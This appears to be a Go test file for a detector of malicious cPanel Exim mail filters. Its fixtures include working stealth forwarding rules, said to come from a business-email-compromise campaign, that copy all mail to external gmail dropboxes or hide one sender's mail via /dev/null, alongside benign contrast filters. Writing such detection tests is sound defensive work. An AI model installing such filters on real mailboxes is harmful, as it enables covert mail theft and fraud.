// Real-world malicious filter bodies observed in a live BEC campaign. Each
// installs a stealth interception rule: copy every message to an attacker
// dropbox while keeping a local copy so the victim never notices.
//
// Documentation addresses (RFC 2606 example.* / a placeholder gmail) stand in
// for the real attacker dropboxes.
const filterAuraStealth = `# Exim filter - auto-generated by cPanel.
headers charset "UTF-8"

if not first_delivery and error_message then finish endif

#24
if
 $header_from: contains "@"
then
 deliver "dropbox001@gmail.com"
 deliver "\"$local_part+INBOX\"@$domain"
endif
`

const filterVioricaStealth = `# Exim filter - auto-generated by cPanel.
headers charset "UTF-8"

if not first_delivery and error_message then finish endif

#.
if
 foranyaddress $h_to:,$h_cc: ( $thisaddress contains "@" )
then
 save "$home/mail/example.com/viorica/"
 deliver "dropbox811@gmail.com"
endif
`

const filterOanaStealth = `# Exim filter - auto-generated by cPanel.
headers charset "UTF-8"

if not first_delivery and error_message then finish endif

#26
if
 $header_from: contains "@"
then
 deliver "dropbox-lives@gmail.com"
 save "$home/mail/example.com/oana/" 660
endif
`

// Legitimate: owner duplicates mail from specific senders into their own
// inbox. No external destination, narrow conditions. Must not alert.
const filterGeorgeLegit = `# Exim filter - auto-generated by cPanel.
headers charset "UTF-8"

if not first_delivery and error_message then finish endif

#uniqa.ro
if
 $header_from: contains "uniqa.ro"
then
 save "$home/mail/example.com/george/" 660
endif

#crowdestate.eu
if
 $header_from: contains "crowdestate.eu"
then
 deliver "\"$local_part+INBOX\"@$domain"
endif
`

// Plain external forward of one mailbox, no local copy, narrow condition.
// Suspicious only when newly added.
const filterPlainForward = `# Exim filter - auto-generated by cPanel.
headers charset "UTF-8"

if not first_delivery and error_message then finish endif

#office
if
 $header_to: contains "office@example.com"
then
 deliver "owner-personal@gmail.com"
endif
`

// External forward + /dev/null: intercept one sender and hide it. Stealth.
const filterDevNullIntercept = `# Exim filter - auto-generated by cPanel.
headers charset "UTF-8"

if not first_delivery and error_message then finish endif

#spy
if
 $header_from: contains "@boss.example.net"
then
 deliver "spy@gmail.com"
 save "/dev/null" 660
endif
`

func TestParseEximFilterStealthRule(t *testing.T) {
	rules := parseEximFilter(filterAuraStealth)

	// The boilerplate "if not first_delivery..." plus the #24 rule -> two rules,
	// but only the #24 rule carries deliver actions.
	var stealth *filterRule
	for i := range rules {
		if len(rules[i].actions) == 2 {
			stealth = &rules[i]
		}
	}
	if stealth == nil {
		t.Fatalf("parseEximFilter did not return the two-action stealth rule; got %+v", rules)
	}
	if !stealth.matchesAll {
		t.Errorf("stealth rule should match all mail (From contains @); condition=%q", stealth.condition)
	}
	if stealth.actions[0].verb != "deliver" || stealth.actions[0].arg != "dropbox001@gmail.com" {
		t.Errorf("action[0] = %+v, want deliver dropbox001@gmail.com", stealth.actions[0])
	}
	// Escaped quotes in the self re-delivery must survive tokenizing.
	if stealth.actions[1].verb != "deliver" || !strings.Contains(stealth.actions[1].arg, "$local_part+INBOX") {
		t.Errorf("action[1] = %+v, want self +INBOX re-delivery", stealth.actions[1])
	}
}

func TestParseEximFilterSingleLineFinishIsNotMatchAll(t *testing.T) {
	rules := parseEximFilter(filterAuraStealth)
	for _, r := range rules {
		if len(r.actions) == 1 && r.actions[0].verb == "finish" {
			if r.matchesAll {
				t.Errorf("boilerplate finish rule must not be match-all; condition=%q", r.condition)
			}
			return
		}
	}
	t.Fatalf("single-line finish rule not parsed: %+v", rules)
}

func TestConditionMatchesAll(t *testing.T) {
	tests := []struct {
		cond string
		all  bool
	}{
		{`$header_from: contains "@"`, true},
		{`foranyaddress $h_to:,$h_cc: ( $thisaddress contains "@" )`, true},
		{`$header_to: contains "office@example.com"`, false},
		{`$header_from: contains "uniqa.ro"`, false},
		{`$header_subject: contains "Cod autentificare"`, false},
		{"", true}, // unconditional
		{`not first_delivery and error_message`, false},
	}
	for _, tt := range tests {
		if got := conditionMatchesAll(tt.cond); got != tt.all {
			t.Errorf("conditionMatchesAll(%q) = %v, want %v", tt.cond, got, tt.all)
		}
	}
}

func TestScoreFilterRulesStealthIsCriticalExfil(t *testing.T) {
	localDomains := map[string]bool{"example.com": true}

	cases := []struct {
		name string
		body string
		mb   filterMailbox
	}{
		{"aura", filterAuraStealth, filterMailbox{localPart: "aura", domain: "example.com"}},
		{"viorica", filterVioricaStealth, filterMailbox{localPart: "viorica", domain: "example.com"}},
		{"oana", filterOanaStealth, filterMailbox{localPart: "oana", domain: "example.com"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rules := parseEximFilter(tc.body)
			got := scoreFilterRules(rules, tc.mb, localDomains, nil)

			var exfil *filterFinding
			for i := range got {
				if got[i].kind == "exfil" {
					exfil = &got[i]
				}
			}
			if exfil == nil {
				t.Fatalf("expected an exfil finding, got %+v", got)
			}
			if exfil.severity != alert.Critical {
				t.Errorf("exfil severity = %v, want Critical", exfil.severity)
			}
			if exfil.onlyIfNew {
				t.Error("stealth exfil must alert regardless of newness")
			}
			if !strings.Contains(exfil.dest, "@gmail.com") {
				t.Errorf("exfil dest = %q, want the external dropbox", exfil.dest)
			}
		})
	}
}

